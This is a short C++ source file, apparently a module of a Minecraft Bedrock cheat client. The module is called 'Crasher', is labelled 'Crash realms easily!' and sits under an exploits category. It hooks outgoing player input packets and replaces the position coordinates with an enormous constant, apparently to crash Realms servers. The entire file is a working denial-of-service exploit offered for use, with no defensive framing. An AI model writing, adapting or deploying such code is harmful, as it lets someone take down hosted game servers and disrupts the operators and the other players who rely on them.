#include "Crasher.h"

Crasher::Crasher() : IModule(0x0, Category::EXPLOITS, "Crash realms easily!") {
}


Crasher::~Crasher() {
}

const char* Crasher::getModuleName() {
	return ("Crasher");
}

void Crasher::onSendPacket(C_Packet* packet) {
	if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
		PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
		InputPacket->pos.x = static_cast<float>(0xE6EC5A19);
		InputPacket->pos.y = static_cast<float>(0xE6EC5A19);
		InputPacket->pos.z = static_cast<float>(0xE6EC5A19);
	}
}